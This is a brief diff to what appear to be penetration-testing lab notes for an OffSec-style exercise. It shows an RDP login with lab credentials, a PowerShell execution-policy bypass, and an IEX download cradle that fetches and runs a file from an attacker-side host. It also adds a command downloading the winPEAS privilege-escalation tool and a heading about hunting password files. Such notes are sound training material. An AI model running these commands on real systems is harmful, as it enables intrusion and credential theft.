@@ -8,7 +8,10 @@ xfreerdp /u:offsec /p:lab /v:192.168.218.196
 powershell -ExecutionPolicy Bypass
 
 ## dowbnload file via powershell
-IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.8.236:8000/program.exe');
+
+> IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.8.236:8000/program.exe');
+
+> Invoke-WebRequest -URI "http://192.168.45.167/winPEASx64.exe" -OutFile winPEAS.exe
 
 ## powerhell, find password file db
 ```
